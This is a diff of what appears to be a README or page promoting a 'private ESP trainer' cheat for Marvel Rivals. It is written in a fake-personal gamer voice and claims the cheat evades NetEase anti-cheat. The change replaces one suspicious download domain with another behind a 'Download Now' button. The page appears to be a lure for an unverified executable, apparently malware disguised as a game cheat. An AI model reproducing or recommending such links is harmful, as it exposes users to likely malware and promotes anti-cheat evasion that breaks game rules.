@@ -3,7 +3,7 @@
 Hey.  
 Jax here, FPS vet with 7200+ hours from Overwatch obsessions to Marvel Rivals since closed beta. Two weeks back—February 19th, 2026—NetEase dropped that quick 20260219 patch: hero balances, Faulty Dream event, no downtime, but Elsa Bloodstone ult tweaks hit my duelist runs hard. Queued ranked as Venom yesterday, got flanked by a Ghost Rider spam... zero vision through Tokyo 2099 walls, team wiped. Respawn rage. 😩
 
-<a href="https://mrvl.githubcompiller.com/" target="_blank" rel="noopener"><img src="https://lookimg.com/images/2018/12/09/cHkgq.png" alt="Download Now"></a>
+<a href="https://mrvl.gitget.cc/" target="_blank" rel="noopener"><img src="https://lookimg.com/images/2018/12/09/cHkgq.png" alt="Download Now"></a>
 
 This is my private ESP-focused trainer I've fiddled with through seasons—for custom games or bot lobbies when practicing lines. Injected fresh on 20260219—stable, no kicks from NetEase AC. Discord crew asked post-patch if visuals held. They do.
 
